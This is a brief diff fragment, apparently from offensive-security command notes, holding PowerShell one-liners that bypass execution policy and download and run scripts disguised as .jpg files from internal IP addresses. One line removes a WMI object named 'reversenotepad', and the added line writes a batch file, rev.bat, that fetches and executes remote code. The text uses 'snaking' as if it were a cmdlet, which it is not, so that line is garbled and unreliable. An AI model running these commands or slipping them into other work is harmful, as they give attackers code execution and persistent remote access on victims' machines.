@@ -11,3 +11,4 @@ powershell -nop -exe bypass -c "iex(New-Object Net.WebClient).DownloadString('ht
 
 excluir
 powershell -nop -exe bypass -c "iex(New-Object Net.WebClient).DownloadString('http://10.0.2.50/wmic.jpg'); snaking -Name reversenotepad | Remove-WmiObject"
+echo powershell.exe -nop -exe bypass iex(new-object net.webclient).downloadstring('http://172.16.192.200/fig.jpg') > rev.bat
